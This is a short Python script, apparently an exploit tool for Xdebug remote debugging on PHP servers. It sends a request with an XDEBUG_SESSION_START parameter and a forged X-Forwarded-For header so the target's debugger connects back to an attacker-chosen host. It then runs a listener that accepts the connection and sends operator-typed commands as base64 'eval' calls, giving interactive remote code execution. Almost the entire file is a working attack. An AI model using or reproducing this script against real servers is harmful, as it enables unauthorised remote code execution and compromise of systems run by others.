#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""learn from https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
"""

import socket
import requests


class XDebug(object):

    def __init__(self):
        super(XDebug, self).__init__()

    def req(self, url, forward):
        """send debug request

        Args:
            url (str): target url
            forward (str): remote server
        """
        params = {"XDEBUG_SESSION_START": "phpstorm"}
        headers = {"X-Forwarded-For": forward}
        requests.get(url, params=params, headers=headers)

    def listen(self, ip="0.0.0.0", port=9000):
        """wait for connect

        Args:
            ip (str, optional): bind ip
            port (int, optional): bind port
        """
        ip_port = (ip, port)
        sk = socket.socket()
        sk.bind(ip_port)
        sk.listen(10)
        conn, addr = sk.accept()
        while True:
            client_data = conn.recv(1024)
            print(client_data)
            data = raw_input('>> ')
            conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
